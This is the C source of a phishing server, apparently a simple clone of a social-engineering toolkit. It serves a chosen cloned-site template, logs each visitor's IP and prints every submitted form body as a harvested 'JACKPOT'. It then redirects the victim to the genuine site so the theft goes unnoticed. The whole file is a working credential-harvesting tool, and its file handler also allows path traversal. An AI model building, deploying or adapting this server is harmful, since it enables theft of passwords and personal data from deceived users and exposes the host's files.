#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <dirent.h>
#include <time.h>
#include <sys/stat.h>

#define PORT 5000
#define BUFFER_SIZE 1024 * 500

char selected_template[256];

// Fungsi untuk mengirim file (Binary & Text)
void send_file(int client_socket, char *file_path, char *content_type) {
    FILE *f = fopen(file_path, "rb");
    if (f) {
        char header[512];
        sprintf(header, "HTTP/1.1 200 OK\r\nContent-Type: %s\r\nConnection: close\r\n\r\n", content_type);
        write(client_socket, header, strlen(header));

        unsigned char buffer[1024];
        int bytes_read;
        while ((bytes_read = fread(buffer, 1, sizeof(buffer), f)) > 0) {
            send(client_socket, buffer, bytes_read, 0);
        }
        fclose(f);
    }
}

void handle_client(int client_socket, struct sockaddr_in client_addr) {
    char buffer[BUFFER_SIZE];
    int len = recv(client_socket, buffer, BUFFER_SIZE, 0);
    if (len <= 0) { close(client_socket); return; }

    char method[10], path[256];
    sscanf(buffer, "%s %s", method, path);

    if (strcmp(path, "/") == 0 && strcmp(method, "GET") == 0) {
        printf("\n\033[93m[!] VISITOR DEECTED!\033[0m\n");
        printf(" └── IP: %s\n", inet_ntoa(client_addr.sin_addr));
        char full_path[512];
        sprintf(full_path, "templates/%s/index.html", selected_template);
        send_file(client_socket, full_path, "text/html");
    } else if (strcmp(method, "GET") == 0) {
        char full_path[512];
        sprintf(full_path, "templates/%s%s", selected_template, path);
        char *type = "text/plain";
        if (strstr(path, ".css")) type = "text/css";
        else if (strstr(path, ".png")) type = "image/png";
        else if (strstr(path, ".jpg") || strstr(path, ".jpeg")) type = "image/jpeg";
        else if (strstr(path, ".js")) type = "application/javascript";
        send_file(client_socket, full_path, type);
    } else if (strcmp(method, "POST") == 0) {
        char *data = strstr(buffer, "\r\n\r\n");
        if (data) {
            data += 4;
            printf("\n\033[91m[!] WE GOT A JACKPOT! [%s]\033[0m\n", selected_template);
            printf(" └── Raw: %s\n", data);
        }
        char redir[512];
        sprintf(redir, "HTTP/1.1 302 Found\r\nLocation: https://www.%s.com\r\n\r\n", selected_template);
        send(client_socket, redir, strlen(redir), 0);
    }
    close(client_socket);
}

int main() {
    struct dirent *de;
    DIR *dr = opendir("templates");
    char folders[100][256];
    int count = 0;

    if (dr == NULL) {
        printf("\033[91m[!] Folder 'templates' not found!\033[0m\n");
        return 1;
    }

    printf("\033[36m========================================\n");
    printf("       SOCIAL ENGINEERING TEMPLATED BASED (SET-B)\n");
    printf("========================================\033[0m\n");

    while ((de = readdir(dr)) != NULL && count < 100) {
        if (de->d_type == DT_DIR && de->d_name[0] != '.') {
            strcpy(folders[count], de->d_name);
            printf(" [\033[92m%04d\033[0m] %s\n", count, folders[count]);
            count++;
        }
    }
    closedir(dr);

    if (count == 0) {
        printf("[!] not found any templwtes.\n");
        return 1;
    }

    int choice;
    printf("\n\033[93mChoose Template: \033[0m");
    if (scanf("%d", &choice) != 1 || choice >= count || choice < 0) {
        printf("[!] Index invalid!\n");
        return 1;
    }
    strcpy(selected_template, folders[choice]);

    // Setup Socket
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind fsiled");
        return 1;
    }
    listen(server_fd, 10);

    printf("\n\033[92m[*] Server running at http://0.0.0.0:%d\033[0m\n", PORT);
    printf("[*] Using Template: %s\n", selected_template);

    while (1) {
        new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen);
        handle_client(new_socket, address);
    }

    return 0;
}
